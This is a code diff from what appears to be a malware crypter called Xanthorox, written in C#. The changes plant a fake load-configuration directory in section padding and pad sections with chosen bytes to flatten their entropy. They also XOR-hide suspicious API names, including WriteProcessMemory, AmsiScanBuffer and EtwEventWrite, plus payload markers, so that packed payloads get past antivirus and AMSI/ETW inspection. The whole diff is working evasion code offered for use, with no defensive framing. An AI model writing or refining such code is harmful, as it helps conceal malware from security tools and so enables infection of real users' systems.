@@ -806,37 +806,73 @@ namespace XanthoroxCrypted.Core
             uint existing = BitConverter.ToUInt32(pe, loadCfgDD);
             if (existing != 0) return;
 
-            // Minimal IMAGE_LOAD_CONFIG_DIRECTORY64 (first 112 bytes)
-            // Size field + SecurityCookie + GuardCFCheckFunctionPointer
-            byte[] loadCfg = new byte[112];
-            BitConverter.GetBytes((uint)112).CopyTo(loadCfg, 0); // Size
+            // Find a section with enough writable padding for LoadConfig data.
+            // Must be within a mapped section so the OS loader can find it.
+            int peOffsetLocal = peOffset;
+            int numSections = BitConverter.ToUInt16(pe, peOffsetLocal + 6);
+            int optHeaderSize = BitConverter.ToUInt16(pe, peOffsetLocal + 20);
+            int sectionStart = peOffsetLocal + 24 + optHeaderSize;
 
-            // TimeDateStamp — match our PE timestamp
+            uint targetRawOff = 0;
+            uint targetRVA = 0;
+            uint targetRawSz = 0;
+            uint targetVirtSz = 0;
+            const int loadCfgSize = 112;
+
+            for (int s = 0; s < numSections; s++)
+            {
+                int secHdr = sectionStart + (s * 40);
+                if (secHdr + 40 > pe.Length) break;
+                uint chars = BitConverter.ToUInt32(pe, secHdr + 36);
+                // Must be writable, readable, non-discardable, non-executable
+                if ((chars & 0x80000000) == 0) continue; // Writable
+                if ((chars & 0x40000000) == 0) continue; // Readable
+                if ((chars & 0x02000000) != 0) continue; // Skip discardable
+                if ((chars & 0x20000000) != 0) continue; // Skip executable
+
+                uint rva = BitConverter.ToUInt32(pe, secHdr + 12);
+                uint vsz = BitConverter.ToUInt32(pe, secHdr + 8);
+                uint raw = BitConverter.ToUInt32(pe, secHdr + 20);
+                uint rsz = BitConverter.ToUInt32(pe, secHdr + 16);
+
+                // Use padding zone (between VirtualSize and RawSize) if available
+                if (rsz > vsz && (rsz - vsz) >= loadCfgSize)
+                {
+                    targetRawOff = raw + vsz;
+                    targetRVA = rva + vsz;
+                    targetRawSz = rsz;
+                    targetVirtSz = vsz;
+                    break;
+                }
+            }
+
+            if (targetRawOff == 0) return; // No suitable section found
+
+            // Minimal IMAGE_LOAD_CONFIG_DIRECTORY64
+            byte[] loadCfg = new byte[loadCfgSize];
+            BitConverter.GetBytes((uint)loadCfgSize).CopyTo(loadCfg, 0); // Size
+
             int tsOff = peOffset + 8;
-            Array.Copy(pe, tsOff, loadCfg, 4, 4);
+            Array.Copy(pe, tsOff, loadCfg, 4, 4); // TimeDateStamp
 
-            // Major/MinorVersion matching Windows 10
             loadCfg[8] = 10; loadCfg[9] = 0;  // MajorVersion
             loadCfg[10] = 0; loadCfg[11] = 0; // MinorVersion
 
-            // GlobalFlagsClear and GlobalFlagsSet = 0 (normal)
-            // CriticalSectionDefaultTimeout
-            BitConverter.GetBytes((uint)0x00002710).CopyTo(loadCfg, 16); // 10000ms
+            BitConverter.GetBytes((uint)0x00002710).CopyTo(loadCfg, 16); // CriticalSectionDefaultTimeout
+            BitConverter.GetBytes((uint)0x00000001).CopyTo(loadCfg, is64 ? 48 : 28); // ProcessHeapFlags
 
-            // ProcessHeapFlags
-            BitConverter.GetBytes((uint)0x00000001).CopyTo(loadCfg, is64 ? 48 : 28);
-
-            // Write to a padding location and update DataDirectory
-            int padStart = pe.Length - 1024;
-            if (padStart < 0) return;
-
+            // Verify the padding area is clear
             bool clear = true;
-            for (int i = padStart; i < padStart + loadCfg.Length && clear; i++)
+            for (int i = (int)targetRawOff; i < (int)targetRawOff + loadCfgSize && clear; i++)
                 if (pe[i] != 0) clear = false;
-
             if (!clear) return;
 
-            Array.Copy(loadCfg, 0, pe, padStart, loadCfg.Length);
+            // Write LoadConfig data to section padding
+            Array.Copy(loadCfg, 0, pe, (int)targetRawOff, loadCfgSize);
+
+            // Update DataDirectory[10] to point to the LoadConfig
+            WriteU32(pe, loadCfgDD, targetRVA);
+            WriteU32(pe, loadCfgDD + 4, (uint)loadCfgSize);
         }
 
         // ═══════════════════════════════════════════════
@@ -859,6 +895,7 @@ namespace XanthoroxCrypted.Core
 
                 uint rawOff = BitConverter.ToUInt32(pe, secHdr + 20);
                 uint rawSz = BitConverter.ToUInt32(pe, secHdr + 16);
+                uint virtSz = BitConverter.ToUInt32(pe, secHdr + 8);
                 uint chars = BitConverter.ToUInt32(pe, secHdr + 36);
 
                 if (rawSz == 0 || rawOff + rawSz > pe.Length) continue;
@@ -866,18 +903,25 @@ namespace XanthoroxCrypted.Core
                 // Only equalize writable data sections (not .text)
                 if ((chars & 0x20000000) != 0) continue; // Skip executable
                 if ((chars & 0x40000000) == 0) continue; // Must be readable
+                if ((chars & 0x02000000) != 0) continue; // Skip discardable (.reloc etc.)
 
-                // Calculate current entropy
+                // CRITICAL: Only modify padding zone (between VirtualSize and RawSize).
+                // All bytes within VirtualSize are real data — modifying them corrupts
+                // relocation targets, global variables, and config structures.
+                uint paddingStart = rawOff + Math.Min(virtSz, rawSz);
+                uint paddingEnd = rawOff + rawSz;
+                if (paddingStart >= paddingEnd) continue;
+
+                // Calculate current entropy in padding zone only
                 int[] freq = new int[256];
-                for (uint i = rawOff; i < rawOff + rawSz; i++)
+                for (uint i = paddingStart; i < paddingEnd; i++)
                     freq[pe[i]]++;
 
-                // Find bytes with zero frequency and inject them into null padding
                 int nullCount = freq[0];
-                if (nullCount < 32) continue;
+                if (nullCount < 16) continue;
 
                 int injectCount = 0;
-                for (uint i = rawOff; i < rawOff + rawSz && injectCount < nullCount / 4; i++)
+                for (uint i = paddingStart; i < paddingEnd && injectCount < nullCount / 4; i++)
                 {
                     if (pe[i] == 0)
                     {
@@ -896,20 +940,15 @@ namespace XanthoroxCrypted.Core
                             if (inExclusion) continue;
                         }
 
-                        // Check if this might be part of a null terminator
-                        bool isTerminator = (i + 1 < rawOff + rawSz && pe[i + 1] == 0);
-                        if (!isTerminator)
+                        for (int b = 1; b < 256; b++)
                         {
-                            for (int b = 1; b < 256; b++)
+                            if (freq[b] < (paddingEnd - paddingStart) / 512)
                             {
-                                if (freq[b] < rawSz / 512)
-                                {
-                                    pe[i] = (byte)b;
-                                    freq[b]++;
-                                    freq[0]--;
-                                    injectCount++;
-                                    break;
-                                }
+                                pe[i] = (byte)b;
+                                freq[b]++;
+                                freq[0]--;
+                                injectCount++;
+                                break;
                             }
                         }
                     }
@@ -928,7 +967,8 @@ namespace XanthoroxCrypted.Core
                 "VirtualAlloc", "VirtualProtect", "CreateThread",
                 "WriteProcessMemory", "NtAllocateVirtualMemory",
                 "AmsiScanBuffer", "EtwEventWrite",
-                ".xthrx", "XCONFIG", "XPAYLOAD", "XKEY00"
+                ".xthrx", "XCONFIG", "XPAYLOAD", "XKEY00",
+                "Xanthorox", "Xanthorox-OFCrypt"
             };
 
             byte xorKey = (byte)(_rng.Next(1, 255));
@@ -952,7 +992,9 @@ namespace XanthoroxCrypted.Core
                         // Don't encrypt sentinel markers we need for patching
                         // Check if this is in the .xthrx section (our config area)
                         // Skip it — those need to be findable by the builder
-                        if (pattern == "XCONFIG" || pattern == "XPAYLOAD" || pattern == "XKEY00")
+                        // Also skip integrity-check strings the stub reads at startup
+                        if (pattern == "XCONFIG" || pattern == "XPAYLOAD" || pattern == "XKEY00"
+                            || pattern == "Xanthorox" || pattern == "Xanthorox-OFCrypt")
                             continue;
 
                         // XOR encrypt in-place
